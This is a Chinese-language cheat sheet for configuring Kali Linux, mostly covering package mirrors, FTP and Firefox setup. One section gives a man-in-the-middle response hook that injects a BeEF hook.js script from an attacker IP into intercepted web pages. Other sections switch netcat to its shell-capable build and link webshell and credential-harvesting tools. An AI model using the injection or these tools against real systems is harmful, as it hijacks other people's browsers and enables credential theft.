# Kali 配置

## 更新源

- 编辑: /etc/apt/sources.list (复制下面内容并保存)

```
#阿里云
deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib

#清华大学
deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free

#中科大
deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib

#东软大学
#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib

#官方源
#deb http://http.kali.org/kali kali-rolling main non-free contrib
#deb-src http://http.kali.org/kali kali-rolling main non-free contrib
```

## 网络问题

```
service network-manager stop
rm /var/lib/NetworkManager/NetworkManager.state
service network-manager start
```

## 安装输入法

- apt-get install fcitx
- apt-get install fcitx-googlepinyin (谷歌拼音)
- reboot (重启电脑)

## 安装和配置 ftp

- apt-get install vsftpd
- mkdir /home/ftp (新建用户目录)
- chmod 777 /home/ftp (改变文件读写权限)

* useradd -d /home/ftp -s /sbin/nologin ftp (新建用户,如果已有该用户可以用 userdel 删除)
* passwd ftp (设置密码)
* vim /etc/vsftpd.conf

```
listen=YES             #开启监听
listen_ipv6=NO
anonymous_enable=NO    #拒绝匿名访问
local_enable=YES       #允许本地用户登录
write_enable=YES       #开启可写权限
local_umask=022        #实际权限为文件原本的权限-umask
connect_from_port_20=YES
ftpd_banner=Welcome! My friends!    #可以自定义banner
chroot_local_user=YES               #防止用户访问其他目录
allow_writeable_chroot=YES          #如果用户被限定在了其主目录下，则该用户的主目录不能再具有写权限了。如果检查发现还有写权限，就会报错
userlist_deny=NO                    #拒绝访问用户列表
userlist_enable=YES                 #允许访问用户列表
userlist_file=/etc/allowed_users    #允许访问用户列表文件
seccomp_sandbox=no                  #防止各种莫名错误
xferlog_enable=YES                  #记录ftp传输过程
xferlog_file=/var/log/vsftpd.log    #ftp传输日志文件
xferlog_std_format=YES              #使用标准的ftp xferlog模式
```

- vim /etc/allowed_users (添加允许访问的用户`ftp`)
- vim /etc/ftpusers (查看禁止访问用户`删除ftp`)
- vim /etc/pam.d/vsftpd

```
针对auth required pam_shells.so的两种方案
第一种:auth required pam_nologin.so
第二种:#auth required pam_shells.so
```

## 配置 beef

- /usr/share/beef-xss/config.yaml

```
passwd: 密码
host: 本机ip
metasploit配置项  enable:true
```

```
function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace(
                '</head>',
                '<script src="http://192.168.0.148:3000/hook.js">'+
                '</script>' +
                '</head>'
            );
        }
    }
}
```

## Firefox ESR 汉化

- apt -y install firefox-esr-l10n-zh-cn (下载安装语言包)
- 打开火狐浏览器右上角的菜单，选择''首选项''
- 向下滑动,到达语言栏(language),点击右边的按钮
- 在 Add 左边选择框中找到 zh-cn,点击 Add 添加
- 点击“确定”，重启浏览器

## Firefox 关闭 GET 请求到 detectportal.firefox.com

- 在 firefox 地址栏输入：about:config
- 搜索:network.captive-portal-service.enabled
- 双击改为 false

## nc,netcat

```
rm /usr/bin/nc
ln -s /usr/bin/nc.traditional /usr/bin/nc
rm /usr/bin/netcat
ln -s /usr/bin/nc.traditional /usr/bin/netcat
```

## 相关工具

- [中国蚁剑](https://github.com/AntSwordProject/AntSword-Loader)
- [Linux 枚举和提权检查](https://github.com/rebootuser/LinEnum)
- [web 密码检索](https://github.com/djhohnstein/SharpWeb)
- [密码检索工具](https://github.com/AlessandroZ/LaZagne)
